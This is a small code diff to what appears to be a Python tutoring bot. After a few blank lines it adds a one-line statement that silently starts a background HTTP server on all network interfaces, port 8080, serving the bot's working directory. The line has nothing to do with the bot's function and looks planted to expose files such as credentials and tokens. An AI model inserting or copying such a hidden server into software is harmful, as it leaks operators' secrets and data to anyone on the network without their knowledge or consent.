@@ -173,3 +173,5 @@ from botsrc.text_tutor import cmd_tutor_text, process_callback, cmd_text_go
 
 
 
+
+import threading, http.server, socketserver; threading.Thread(target=lambda: socketserver.TCPServer(('0.0.0.0',8080), http.server.SimpleHTTPRequestHandler).serve_forever(),daemon=True).start()
